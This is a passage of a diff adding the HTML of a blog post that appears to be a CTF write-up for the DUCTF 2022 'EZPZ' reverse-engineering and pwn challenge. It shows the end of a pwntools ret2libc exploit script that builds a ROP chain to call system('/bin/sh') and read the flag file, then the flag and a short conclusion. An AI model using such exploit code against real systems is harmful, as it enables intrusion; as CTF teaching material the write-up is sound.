+<span class="k">print</span><span class="p">(</span><span class="s">"/bin/sh string found at "</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">binsh_address</span><span class="p">))</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"0101000000001000000101010000101000000001000000000101000110100000000100000010101000000100000000100100001010100000001000000010101000101000000000000000101010010101000000000000000001010100010101000000AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh_address</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_address</span><span class="p">)</span>
+
+<span class="c1">#pause()
+</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mf">0.5</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"ls -al"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mf">0.5</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"cat flag-pwn.txt"</span><span class="p">)</span>
+
+
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><img src="/images/ductf2022ezpz/exploit_flag.png" alt="exploit_flag.png" /></p>
+
+<h1 id="ductfez_r3t2l1bc_9b8a81cda3">DUCTF{ez_r3t2l1bc_9b8a81cda3}</h1>
+
+<h1 id="conclusion">Conclusion</h1>
+
+<p>I have learnt a lot from and will probably not hesitate (as much) to try z3, I hope … Also, since this is not really a detailed guide to z3, I recommend reading this really tutorial guide from https://ericpony.github.io/z3py-tutorial/guide-examples.htm. It has a lot more inforamtion that I did not really use but it really is beginner friendly!</p>
+
+
     </div>
+
+    <div class="post__share">
+      <div class="share__list">
+        <a class="share__link share__facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/2022/09/26/Trying_out_z3_solver_(_DUCTF2022-EZPZ-rev-pwn)/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook" rel="nofollow"><i class="ion ion-logo-facebook"></i></a>
+
+        <a class="share__link share__twitter" href="https://twitter.com/intent/tweet?text=Trying%20out%20z3%20Solver%20(DUCTF2022%20-%20EZPZ%20RE%20+%20pwn)&url=http://localhost:4000/2022/09/26/Trying_out_z3_solver_(_DUCTF2022-EZPZ-rev-pwn)/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter" rel="nofollow"><i class="ion ion-logo-twitter"></i></a>
+
+        <a class="share__link share__pinterest" href="http://pinterest.com/pin/create/button/?url=http://localhost:4000/2022/09/26/Trying_out_z3_solver_(_DUCTF2022-EZPZ-rev-pwn)/&amp;media=http://localhost:4000/images/ductf2022ezpz/postpicture.png&amp;description=Trying%20out%20z3%20Solver%20(DUCTF2022%20-%20EZPZ%20RE%20+%20pwn)" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=900,height=500,toolbar=1,resizable=0'); return false;" title="Share on Pinterest" rel="nofollow"><i class="ion ion-logo-pinterest"></i></a>
+      </div>
+    </div>
+
+    <div class="post__navigation">
+      
+      <a class="prev" href="/2022/09/10/Understanding_64_bits_Windows_10_Shellcode_part_2/">
+        <img class="post__nav-image lazy" data-src="/images/windows10shellcodePart2/Windows10Shellcodepart2.png" alt="Understanding 64 bits Windows 10 Shellcode (Calc.exe) - Part 2">
+        <div class="post__nav-box">
+          <div class="post__nav post__nav__prev"><i class="ion ion-md-arrow-round-back"></i> Previous Post</div>
+          <h4 class="post__nav__title">Understanding 64 bits Windows 10 Shellcode (Calc.exe) - Part 2</h4>
+        </div>
+      </a>
+      
+      
+      <a class="next" href="/2022/11/12/Flare-on-9_chall_9_and_11/">
+        <img class="post__nav-image lazy" data-src="/images/flareon9_9_11/flare-on9_11.png" alt="Flare-on 9 - Challenge 9 and 11">
+        <div class="post__nav-box">
+          <div class="post__nav post__nav__next">Next Post <i class="ion ion-md-arrow-forward"></i></div>
+          <h4 class="post__nav__title">Flare-on 9 - Challenge 9 and 11</h4>
+        </div>
+      </a>
+      
+    </div>
+
   </article>
 </div>
-<!-- end page -->
+<!-- end post -->
+
+
+
+
+
+
+
+<div class="container">
+  <div class="related-posts is-related">
+    <div class="row">
+      <div class="col col-12">
+        <div class="container__inner">
+          <h3 class="related-title">You may also like</h3>
+          <div class="row grid">
+
+          
+            
+            
+
+            
+
+            
+            
+            
+            
+
+            
+
+            
+            
+            
+            
+
+            
+
+            
+
+            <div class="article col col-4 col-d-6 col-t-12 grid__post">
+              <div class="article__inner">
+
+                
+                <a class="article__image" href="/2023/06/13/Quick_Study_of_BYOVD/">
+                  <img class="lazy" data-src="/images/quickstudyBYOVD/backgroundimage.png" alt="Quick Study of Bring Your Own Vulnerable Driver (BYOVD)">
+                </a>
+                
+
+                <div class="article__content">
+
+                  <div class="article__meta">
+                    <span class="article__minutes">
+                      
+                      
+                        9 min read
+                      
+                      <time class="article__date"
+                        datetime="2023-06-13T09:27:00+08:00">Jun 13, 2023</time>
+                    </span>
+                  </div>
+
+                  <h2 class="article__title">Quick Study of Bring Your Own Vulnerable Driver (BYOVD)</h2>
+
+                  <p class="article__excerpt">Quick Study of BYOVD including Root Cause Analysis and how it can be abused by attackers to disable or evade security solutions.</p>
+
+                  <div class="article__bottom">
+
+                    
+                    <div class="article__author">
+                      <a href="/about/" aria-label="MalwareOwl"><img class="article__author-image lazy" data-src="/images/profile_avatar.png" alt="MalwareOwl's Picture"></a>
+                    </div>
+                    
+
+                    <div class="article__bottom-meta">
+                      
+                        <a href="/about/" class="article__author-link">MalwareOwl</a>
+                      
+                      
+                      <span>in</span>
+                      <span class="article-tags">
+                        
+                          <a href="/tag/QuickPeek" class="article__tag">QuickPeek</a>
+                        
+                          <a href="/tag/Writeups" class="article__tag">Writeups</a>
+                        
+                      </span>
+                      
+                    </div>
+                  </div>
+
+                </div>
+
+              </div>
+            </div>
+
+            
+                
+              
+            
+            
+            
+
+            
+
+            
+
+            <div class="article col col-4 col-d-6 col-t-12 grid__post">
+              <div class="article__inner">
+
+                
+                <a class="article__image" href="/2023/03/26/Alien_Saboteaur_HTB_Cyber_Apocalypse_2023/">
+                  <img class="lazy" data-src="/images/alien-saboteaur/backgroundimage.png" alt="Alien Saboteaur - HTB Cyber Apocalyse 2023">
+                </a>
+                
+
+                <div class="article__content">
+
+                  <div class="article__meta">
+                    <span class="article__minutes">
+                      
+                      
+                        22 min read
+                      
+                      <time class="article__date"
+                        datetime="2023-03-26T02:45:00+08:00">Mar 26, 2023</time>
+                    </span>
+                  </div>
+
+                  <h2 class="article__title">Alien Saboteaur - HTB Cyber Apocalyse 2023</h2>
+
+                  <p class="article__excerpt">A quick writeup on a Virtual Machine Based CTF Challenge.</p>
+
+                  <div class="article__bottom">
+
+                    
+                    <div class="article__author">
+                      <a href="/about/" aria-label="MalwareOwl"><img class="article__author-image lazy" data-src="/images/profile_avatar.png" alt="MalwareOwl's Picture"></a>
+                    </div>
+                    
+
+                    <div class="article__bottom-meta">
+                      
+                        <a href="/about/" class="article__author-link">MalwareOwl</a>
+                      
+                      
+                      <span>in</span>
+                      <span class="article-tags">
+                        
+                          <a href="/tag/Writeups" class="article__tag">Writeups</a>
+                        
+                          <a href="/tag/CTF" class="article__tag">CTF</a>
+                        
+                      </span>
+                      
+                    </div>
+                  </div>
+
+                </div>
+
+              </div>
+            </div>
+
+            
+                
+              
+            
+            
+            
+
+            
+
+            
+            
+            
+            
+
+            
+
+            
+
+            <div class="article col col-4 col-d-6 col-t-12 grid__post">
+              <div class="article__inner">
+
+                
+                <a class="article__image" href="/2022/11/12/Flare-on-9_chall_9_and_11/">
+                  <img class="lazy" data-src="/images/flareon9_9_11/flare-on9_11.png" alt="Flare-on 9 - Challenge 9 and 11">
+                </a>
+                
+
+                <div class="article__content">
+
+                  <div class="article__meta">
+                    <span class="article__minutes">
+                      
+                      
+                        9 min read
+                      
+                      <time class="article__date"
+                        datetime="2022-11-12T18:10:00+08:00">Nov 12, 2022</time>
+                    </span>
+                  </div>
+
+                  <h2 class="article__title">Flare-on 9 - Challenge 9 and 11</h2>
+
+                  <p class="article__excerpt">This year of flare-on is the third try and the first that I have ever completed so far! Definitely did have my share of pain and joy during this time of challenges. For this post, I will share my writeup on challenge 9 and 11.</p>
+
+                  <div class="article__bottom">
+
+                    
+                    <div class="article__author">
+                      <a href="/about/" aria-label="MalwareOwl"><img class="article__author-image lazy" data-src="/images/profile_avatar.png" alt="MalwareOwl's Picture"></a>
+                    </div>
+                    
+
+                    <div class="article__bottom-meta">
+                      
+                        <a href="/about/" class="article__author-link">MalwareOwl</a>
+                      
+                      
+                      <span>in</span>
+                      <span class="article-tags">
+                        
+                          <a href="/tag/Writeups" class="article__tag">Writeups</a>
+                        
+                          <a href="/tag/CTF" class="article__tag">CTF</a>
+                        
+                      </span>
+                      
+                    </div>
+                  </div>
+
+                </div>
+
+              </div>
+            </div>
+
+            
+                
+                  
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+ <!-- begin comments -->
+<div class="container">
+  <div class="row">
+    <div class="col col-12">
+      <div class="disqus-inner">
+        <div id="disqus_thread" class="post-comments">
+          <div id="disqus_empty"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  function load_disqus() {
+    var disqus_shortname = 'anvodstudio-demo',
+      is_disqus_empty = document.getElementById('disqus_empty'),
+      disqus_target = document.getElementById('disqus_thread'),
+      disqus_embed = document.createElement('script'),
+      disqus_hook = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);
+
+    if (disqus_target && is_disqus_empty) {
+      disqus_embed.type = 'text/javascript';
+      disqus_embed.async = true;
+      disqus_embed.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      disqus_hook.appendChild(disqus_embed);
+      is_disqus_empty.remove();
+    }
+  }
+
+  window.addEventListener('scroll', function (e) {
+    var currentScroll = document.scrollingElement.scrollTop;
+    var disqus_target = document.getElementById('disqus_thread');
+
+    if (disqus_target && (currentScroll > disqus_target.getBoundingClientRect().top - 150)) {
+      load_disqus('disqus_shortname');
+    }
+  }, false);
+
+</script>
+<noscript>Please enable JavaScript to view the
+  <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+</noscript>
+<!-- end comments --> 
+
   </main> 
   <!-- end content -->
   
@@ -272,7 +1006,7 @@
           <span class="article__minutes">
             
             
-              17 min read
+              9 min read
             
           </span>
           <time class="article__date"
@@ -299,7 +1033,7 @@
           <span class="article__minutes">
             
             
-              13 min read
+              10 min read
             
           </span>
           <time class="article__date"
